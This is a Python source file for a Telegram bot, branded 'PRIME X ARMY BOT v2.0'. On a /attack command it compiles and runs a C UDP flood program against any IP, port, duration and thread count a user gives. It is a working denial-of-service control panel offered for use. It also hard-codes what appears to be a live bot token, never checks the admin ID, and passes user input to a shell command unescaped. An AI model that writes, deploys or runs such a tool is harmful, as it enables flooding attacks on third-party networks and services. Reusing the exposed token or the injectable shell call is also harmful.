import telebot
import subprocess
import threading
import time
import os
import signal

BOT_TOKEN = "8766451814:AAGlL61jxZ7gUCnjgfO3GxAB95lv_6ZZdk4"
ADMIN_ID = 1134925647

bot = telebot.TeleBot(BOT_TOKEN)

attack_process = None

def compile_attack():
    if not os.path.exists("./attack"):
        os.system("gcc -o attack attack.c -lpthread -O3")
        os.system("chmod +x attack")

@bot.message_handler(commands=['start'])
def start(msg):
    bot.reply_to(msg, "🔥 *PRIME X ARMY BOT v2.0* 🔥\n\n📌 *Commands:*\n/attack IP PORT TIME THREADS\n/stop\n/status\n\n📌 *Example:*\n/attack 8.8.8.8 80 60 500", parse_mode="Markdown")

@bot.message_handler(commands=['attack'])
def attack(msg):
    global attack_process
    try:
        args = msg.text.split()
        if len(args) < 4:
            bot.reply_to(msg, "❌ *Usage:* `/attack IP PORT TIME THREADS`\n📌 *Example:* `/attack 8.8.8.8 80 60 500`", parse_mode="Markdown")
            return
        
        ip = args[1]
        port = args[2]
        duration = args[3]
        threads = args[4] if len(args) > 4 else "500"
        
        bot.reply_to(msg, f"🚀 *UDP FLOOD ATTACK STARTED!*\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}`s\n🧵 Threads: `{threads}`", parse_mode="Markdown")
        
        def run():
            global attack_process
            compile_attack()
            cmd = f"./attack {ip} {port} {duration} {threads}"
            attack_process = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
            time.sleep(int(duration) + 2)
            if attack_process:
                attack_process.terminate()
                attack_process = None
                bot.send_message(msg.chat.id, f"✅ *ATTACK FINISHED!*\n🎯 Target: `{ip}:{port}`\n⏱️ Duration: `{duration}`s", parse_mode="Markdown")
        
        threading.Thread(target=run).start()
    except Exception as e:
        bot.reply_to(msg, f"❌ *Error:* `{str(e)}`", parse_mode="Markdown")

@bot.message_handler(commands=['stop'])
def stop(msg):
    global attack_process
    if attack_process:
        try:
            os.killpg(os.getpgid(attack_process.pid), signal.SIGTERM)
        except:
            attack_process.terminate()
        attack_process = None
        bot.reply_to(msg, "🛑 *ATTACK STOPPED!*", parse_mode="Markdown")
    else:
        bot.reply_to(msg, "ℹ️ *No active attack running.*", parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status(msg):
    status_text = "🔴 ACTIVE" if attack_process else "🟢 IDLE"
    bot.reply_to(msg, f"⚡️ *BOT STATUS*\n├ Attack: `{status_text}`\n├ Engine: `C UDP Flood`\n├ Bot: 🟢 Online\n└ Powered by @PRIME_X_ARMY", parse_mode="Markdown")

print("╔════════════════════════════════════════════════════════════╗")
print("║              🔥 PRIME X ARMY BOT v2.0 🔥                   ║")
print("║              C UDP Flood Attack Engine                     ║")
print("╚════════════════════════════════════════════════════════════╝")
compile_attack()
print("✅ Attack engine compiled!")
print("✅ Bot started! Waiting for commands...")
bot.infinity_polling()